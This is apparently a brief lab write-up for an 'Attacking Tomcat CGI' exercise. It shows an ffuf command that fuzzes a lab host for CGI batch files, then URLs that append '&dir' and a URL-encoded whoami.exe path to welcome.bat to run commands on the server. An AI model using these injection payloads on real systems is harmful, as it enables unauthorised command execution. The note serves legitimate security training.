# [Attacking Tomcat CGI](Attacking%20Tomcat%20CGI.md)
### After running the URL Encoded 'whoami' payload, what user is tomcat running as?

```shell
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.205.30:8080/cgi/FUZZ.bat
```
![](Screenshot%202026-08-02%20at%2011.31.49.png)
![](Screenshot%202026-08-02%20at%2011.32.09.png)

```http
http://10.129.205.30:8080/cgi/welcome.bat?&dir
```
![](Screenshot%202026-08-02%20at%2011.32.36.png)

```http
http://10.129.205.30:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```
![](Screenshot%202026-08-02%20at%2011.33.38.png)
